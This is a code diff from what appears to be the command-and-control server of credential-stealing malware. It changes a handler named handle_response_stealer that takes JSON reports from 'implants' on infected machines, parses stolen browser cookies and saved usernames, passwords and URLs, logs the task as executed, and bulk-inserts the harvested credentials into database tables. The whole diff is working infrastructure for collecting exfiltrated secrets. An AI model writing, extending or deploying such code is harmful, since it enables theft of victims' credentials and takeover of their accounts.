@@ -216,41 +216,34 @@ def handle_response_stealer():
         request.get_data()
         data = request.data
         data = json.loads(data)
-        cookie_table, password_table = WyattWonderland.newParseJSON(data)
+        cookie_values, password_values = WyattWonderland.newParseJSON(data)
         task_id = data['task_id']
         success = data['success']
-        target_implant_id = data['target_implant_id']
         if success in ['Success', 'success']:
             success = True
         else:
             success = False
         response_data = "Stealer: response recieved. Check logs for this implant to see response."
-        
-        if ((len(username_list) not in [len(password_list), len(url_list)])):
-            print("error: username list not same length as password list")
-        
         query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
         time = datetime.now()
-        response = tools.executeGenericVar(
+        tools.executeGenericVar(
             query, [response_data, success, time, task_id])
-        if response == []:
-            print("\n\nupdate task queue worked\n\n")
 
+        #cookie_table = [prof_cook_list, host_key_list, encrypted_value_list]
+        #password_table = [prof_pw_list, username_list, password_list, url_list]
+        # for i in range(len(prof_cook_list)):
+    #     values_cookie += [(task_id, target_implant_id, prof_cook_list[i], host_key_list[i], encrypted_value_list[i])]
 
-        columns = ['task_id', 'target_implant_id', 'status', 'creator']
+    # values_passwords = []
+    # for i in range(len(prof_pw_list)):
+    #     values_passwords += [(task_id, target_implant_id, prof_pw_list[i], username_list[i], password_list[i], url_list[i])]
 
-        data = target_implant_id, 
-        print("About to send query")
-        print(data)
-        print(current_user)
-        query = tools.insertQueryBuilder("task_queue", columns, ["task_id"])
-        print(f"data: {data}")
-        db_resp = tools.executeInsertQuery(query, data)
-        print(db_resp)
+        query_cookies = "INSERT INTO cookies VALUES (%s, %s, %s, %s, %s)"
 
+        query_passwords = "INSERT INTO passwords VALUES(%s, %s, %s, %s, %s, %s)" 
 
-        # TODO
-        # ingi look at /response_json for how to update tables
+        tools.executeMany(query_cookies, cookie_values)
+        tools.executeMany(query_passwords, password_values)
 
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
